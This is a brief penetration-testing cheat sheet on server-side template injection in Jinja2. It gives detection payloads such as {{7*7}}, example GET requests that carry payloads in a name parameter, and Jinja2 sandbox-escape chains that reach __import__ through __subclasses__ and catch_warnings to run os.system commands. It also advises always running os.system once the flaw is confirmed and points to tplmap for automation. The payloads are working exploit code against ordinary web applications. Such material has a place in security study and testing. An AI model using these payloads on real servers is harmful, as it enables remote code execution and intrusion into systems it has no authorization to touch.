**Template Engine: Jinja 2 Engine**
```html
<html>
<body>
1 <h1>{{ list_title }}</h1>
<h2>{{ list_description }}</h2>
2 {% for item in item_list %}
{{ item }}
{% if not loop.last %},{% endif %}
{% endfor %}
</body>
</html>
```

**Payload Injection**
- Test by injecting payloads in input like `{{1+1}}` and `{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`.
- Some more examples:
  - `${7*7}`
  - `{{7*7}}`
  - `<%= 7*7 %>`
- Example GET request:
  ```
  GET /display_name?name={{7*7}}
  Host: example.com
  ```
- Always try to run the `os.system('ls')` command if vulnerability is confirmed. The command may vary depending on the template engine and programming language.

**Exploiting Jinja 2 Engine**
- Example GET request:
  ```
  GET /display_name?name="{{__import__('os').system('ls')}}"
  Host: example.com
  ```
- If you encounter the error `jinja2.exceptions.UndefinedError: '__import__' is undefined`, try the following Python sandbox escape techniques:

**Python Sandbox Escape Techniques**
1. `{{[].__class__.__bases__[0].__subclasses__()}}`
   - When you submit this, you will see methods like:
   ```
   [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, ...]
   ```
2. Find the `import` command:
   ```jinja2
   {% for x in [].__class__.__bases__[0].__subclasses__() %}
   {% if 'catch_warnings' in x.__name__ %}
   {{x()._module.__builtins__}}
   {% endif %}
   {% endfor %}
   ```
3. Execute `import` command:
   ```jinja2
   {% for x in [].__class__.__bases__[0].__subclasses__() %}
   {% if 'catch_warnings' in x.__name__ %}
   {{x()._module.__builtins__['__import__']('os').system('ls')}}
   {% endif %}
   {% endfor %}
   ```
- Learn more about Python sandbox escape techniques:
   - [CTF Wiki: Python Sandbox Escape](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
   - [HackTricks: Bypassing Python Sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/)
- You can use `tplmap` to automate this task as well.
